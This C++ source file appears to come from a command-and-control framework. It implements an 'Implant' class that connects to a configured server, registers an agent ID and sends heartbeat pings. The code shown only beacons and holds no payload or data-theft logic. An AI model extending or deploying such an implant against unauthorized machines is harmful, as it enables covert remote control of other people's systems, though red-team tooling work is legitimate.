#include <string>
#include <sstream>
#include <fstream>
#include <unistd.h>
#include <thread>
#include <deque>
#include <asio.hpp>
#include <asio/ts/internet.hpp>
#include <asio/ts/buffer.hpp>

#include "implant.h"

using json = nlohmann::json;

Implant::Implant(std::string server_host, std::string server_port, std::string agent_id, bool isRunning):
    host{ std::move(server_host) },
    port{ std::move(server_port) }, 
    id{ std::move(agent_id) },
    isRunning{ std::move(isRunning) }
{
}

void Implant::beacon() {
    if (isRunning) {
        asio::error_code ec;
        asio::ip::tcp::endpoint endpoint(asio::ip::make_address(host, ec), std::stoi(port));
        asio::ip::tcp::socket socket(context); 
        asio::streambuf buf;

        std::deque<std::string> receive_queue;
        std::deque<std::string> send_queue;

        socket.async_connect(endpoint, [&](const asio::error_code& error) {
            if (!error) {
                std::cout << "Connected to the server!" << std::endl;
                
                // Listen for messages, need to have equivalent to .then(), maybe just add callback?
                msg::receiveResponse(socket, buf, receive_queue);

                // Send Register Info
                registerAgent(socket);

                // send heartbeat every x seconds/minutes
                heartbeat(socket);
                    
            } else {
                // Check for specific errors
                if (error == asio::error::connection_refused) {
                    std::cout << "Connection refused. The server may not be running." << std::endl;
                } else {
                    std::cout << "Error connecting to the server: " << error.message() << std::endl;
                }
            }
        });

        context.run();
    }
}

void handleResponse(std::deque<std::string>& response_queue) {
    while (!response_queue.empty()) {
        std::cout << response_queue.front() << std::endl;
        response_queue.pop_front();
    }
}

void Implant::registerAgent(asio::ip::tcp::socket& socket) {
    RegisterAgent registerAgent(id);
    msg::Request registerResult = registerAgent.run();
    msg::sendRequest(socket, registerResult);
}

void periodicPing(PingTask& ping, asio::ip::tcp::socket& socket) {
    while (true) {
        // Perform the ping task
        msg::Request pingResult = ping.run();
        msg::sendRequest(socket, pingResult);

        // Sleep for 5 minutes
        std::this_thread::sleep_for(std::chrono::minutes(5));
    }
}

// TODO: make into own thread or process
void Implant::heartbeat(asio::ip::tcp::socket& socket) {
    PingTask ping(id);
    // Create a thread for the periodic ping task
    // std::thread pingThread(periodicPing, std::ref(ping), std::ref(socket));

    // // Main thread can do other tasks or wait as needed
    // pingThread.join();
    // periodicPing(ping, socket);
    msg::sendRequest(socket, ping.run());
}

void Implant::setRunning(bool running) { isRunning = running; }
void Implant::setId(std::string& new_agent_id) { id = new_agent_id; }